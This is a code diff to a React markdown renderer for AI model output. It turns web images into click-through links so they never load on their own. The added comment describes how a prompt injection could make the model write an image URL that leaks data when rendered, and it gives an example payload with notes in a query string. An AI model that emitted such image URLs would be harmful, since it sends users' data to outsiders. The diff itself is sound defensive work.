@@ -7,7 +7,10 @@
 // markup it did not ask markdown for: raw HTML stays text (the remark step
 // below, as classic does for user messages), links are sanitised and hardened
 // (streamdown's own rehype steps, without rehype-raw), and code renders as
-// plain text with no lazy highlighter. A page citation becomes a chip.
+// plain text with no lazy highlighter. No image ever loads: an image URL the
+// model writes would be fetched on render, which a prompt injection can use
+// to send data out (`![](https://x/?d=<notes>)`), so a web image becomes a
+// link the viewer must click. A page citation becomes a chip.
 
 import { memo, useMemo, type ReactNode } from 'react';
 import { defaultRehypePlugins, defaultRemarkPlugins, Streamdown, type StreamdownProps } from 'streamdown';
@@ -73,6 +76,16 @@ const components = (citationDriveId: string | null): StreamdownProps['components
       <a href={href} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
         {children}
       </a>
+    );
+  },
+  img: ({ src, alt }: WithNode & { readonly src?: unknown; readonly alt?: unknown }) => {
+    const label = typeof alt === 'string' && alt.trim() !== '' ? alt : 'image';
+    return typeof src === 'string' && /^https?:\/\//i.test(src) ? (
+      <a href={src} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
+        {label}
+      </a>
+    ) : (
+      <span>{label}</span>
     );
   },
   strong: ({ children }: WithNode) => <strong className={proseClasses.strong}>{children}</strong>,
